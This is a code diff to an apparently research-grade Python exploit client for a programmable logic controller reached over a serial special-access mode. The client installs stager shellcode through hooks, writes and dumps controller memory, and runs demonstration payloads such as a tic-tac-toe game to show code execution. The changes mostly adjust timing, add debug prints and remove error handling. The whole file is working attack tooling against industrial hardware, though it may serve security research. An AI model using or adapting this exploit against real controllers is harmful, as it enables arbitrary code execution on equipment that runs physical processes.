@@ -16,13 +16,13 @@ import argparse
 from binascii import hexlify
 
 from pwn import remote,context,log,xor
-context.update(log_level="info", bits=32, endian="big")
+context.update(log_level="debug", bits=32, endian="big")
 
 
 
 # Runtime configs
 # The number of seconds to sleep between every request to avoid UART buffer overflows
-SEND_REQ_SAFETY_SLEEP_AMT = 0.03 # Increased from 0.01
+SEND_REQ_SAFETY_SLEEP_AMT = 0.02
 
 
 # The default location of the stager payload
@@ -88,7 +88,7 @@ def calc_checksum_byte(incoming):
     return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]
 
 
-def send_packet(r, msg, step=2, sleep_amt=0.01):
+def send_packet(r, msg, step=2, sleep_amt=0.02):
     """
     The base function to send a single packet. We need to chunk the packet
     up during transmission as to not overflowing the PLC's UART buffer.
@@ -136,7 +136,7 @@ def recv_packet(r):
         return answ[1:-1]
 
 
-def recv_many(r, verbose=False):
+def recv_many(r, verbose=True):
     """
     Receive all packets until an empty packet is received.
     
@@ -149,12 +149,15 @@ def recv_many(r, verbose=False):
 
     while not stop:
         next_chunk = recv_packet(r)
-        if verbose and (len(answ) & 0xff) < 16:
+        print(next_chunk)
+        if verbose: #and (len(answ) & 0xff) < 16:
             print("Read {}".format(len(answ)))
         if next_chunk == "":
             stop = True
+            print("Recv_Many Stop")
         else:
             answ += next_chunk
+    print("Recv_Many exit loop")
     return answ
 
 def encode_packet_for_stager(chunk):
@@ -179,7 +182,7 @@ def encode_packet_for_stager(chunk):
     print("Could not encode chunk: {}".format(chunk.encode("hex")))
     assert (False)
 
-def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01):
+def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.02):
     """
     Transmit an arbitrarily sized message to a listening stager payload.
 
@@ -239,7 +242,7 @@ def subproto_read(r):
     send_packet(r, chr(0x83))
     return recv_packet(r)
 
-def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.01):
+def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.02):
     """
     Only use when alredy in subprotocol handler.
     
@@ -406,13 +409,14 @@ def install_stager(r, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT
     """
     assert(0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE)
     _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no)
+    print(add_hook_no)
     return add_hook_no
 
 
 def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
     invoke_add_hook(r, stager_add_hook_ind,
                        struct.pack(">I", tar_addr), False)
-    send_full_msg_via_stager(r, contents, 8, 0.03) # Increased from 0.01
+    send_full_msg_via_stager(r, contents, 8, 0.01)
 
 
 def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
@@ -442,7 +446,7 @@ def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
         r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
     log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
     assert(answ.startswith("Ok"))
-    contents = recv_many(r, verbose=True)
+    contents = recv_many(r, verbose=False)
     return contents
 
 
@@ -451,23 +455,8 @@ def handle_conn(r, action, args):
     global next_payload_location
 
     print("[+] Got connection")
-    raw_greeting = ""
-    try:
-        # Attempt to read the greeting that was unrecv'd by main().
-        # Max length of greeting read by main() could be 256 + 256 = 512.
-        # Use a timeout to avoid blocking indefinitely if something went wrong with unrecv.
-        raw_greeting = r.recv(512, timeout=0.05)
-        log.info("Raw PLC greeting consumed in handle_conn: %r", raw_greeting)
-        print('\x1b[6;30;42m'+ "[+] Got special access greeting: {} [{}]".format(raw_greeting, hexlify(raw_greeting))+ '\x1b[0m')
-        # It's crucial that this greeting is what we expect, otherwise subsequent protocol messages will be misaligned.
-        if not raw_greeting.startswith("\5-CPU"):
-            log.warn("Consumed greeting in handle_conn (%r) did not start with \\5-CPU as expected.", raw_greeting)
-            # Depending on strictness, might want to return or raise here.
-            # If it's empty or wrong, get_version will likely fail.
-    except Exception as e: # Catches pwntools EOFError if timeout occurs and no data, or socket.timeout
-        log.error("Error consuming initial PLC greeting in handle_conn: %s. Greeting buffer was: %r", str(e), raw_greeting)
-        # If we can't consume the greeting, subsequent protocol communication will likely fail.
-        return # Exit handle_conn
+    answ = recv_packet(r)
+    print('\x1b[6;30;42m'+ "[+] Got special access greeting: {} [{}]".format(answ, hexlify(answ))+ '\x1b[0m')
 
     for i in range(1):
         version = get_version(r)
@@ -513,6 +502,7 @@ def handle_conn(r, action, args):
 
         print("dumping a total of {} bytes of memory at 0x{:08x}".format(args.length, args.address))
         contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind)
+        print("Received Content")
         with open(out_filename, "wb") as f:
             f.write(contents)
         print("Wrote data out to {}".format(out_filename))
@@ -524,29 +514,19 @@ def handle_conn(r, action, args):
 
 
     elif action == ACTION_HELLO_LOOP:
-        answ = invoke_add_hook(r, second_addhook_ind, await_response=False)
+        answ = invoke_add_hook(r, second_addhook_ind, await_response=True)
         while True:
-            packet = recv_packet(r)
-            if packet is None:
-                log.error("HELLO_LOOP: Failed to receive valid packet or connection issue.")
-                time.sleep(0.5) # Avoid tight loop on continuous errors
-                # Consider 'break' if this error means communication is lost
-                continue
-            print("Got packet: {}".format(packet))
+            print("Got packet: {}".format(recv_packet(r)))
 
     elif action == ACTION_TIC_TAC_TOE:
         print("[*] Demonstrating Code Execution")
-        invoke_add_hook(r, second_addhook_ind, await_response=False)
+        invoke_add_hook(r, second_addhook_ind, await_response=True)
+        print("invoked ")
         msg = ""
         END_TOKEN = "==>"
         while END_TOKEN not in msg:
-            packet = recv_packet(r)
-            if packet is None:
-                log.error("TIC_TAC_TOE: Failed to receive valid packet or connection issue.")
-                # Breaking here is probably appropriate as game state would be lost/invalid
-                break
-            msg = packet
-            sys.stdout.write(msg) # msg is now a byte string, sys.stdout might prefer str in py2
+            msg = recv_packet(r)
+            sys.stdout.write(msg)
             sys.stdout.flush()
 
             if "enter a number" in msg:
@@ -626,16 +606,16 @@ def main():
 
 
     parser_test = subparsers.add_parser(ACTION_TEST)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_world/hello_world.bin",
                         help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin')
 
     parser_test = subparsers.add_parser(ACTION_HELLO_LOOP)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_loop/build/hello_loop.bin",
                         help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin')
     
 
     parser_test = subparsers.add_parser(ACTION_TIC_TAC_TOE)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
                         help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin')
 
  
@@ -649,7 +629,7 @@ def main():
     if args.switch_power:
 
         def call_switch_power(mode):
-            base_cmd = ["../tools/powersupply/switch_power.py"]
+            base_cmd = ["tools/powersupply/switch_power.py"]
 
             if args.ps_type == 'http':
                 if not args.powersupply_host:
@@ -694,10 +674,7 @@ def main():
         answ = s.recv(256, timeout=0.3)
         if len(answ) > 0:
             if not answ.startswith("\5-CPU"):
-                try:
-                    answ += s.recv(256, timeout=0.2) # Added short timeout
-                except Exception: # Catch pwntools timeout (EOFError or socket.timeout)
-                    pass # If timeout, answ remains as it was
+                answ += s.recv(256)
             assert(answ.startswith("\5-CPU"))
             s.unrecv(answ)
 
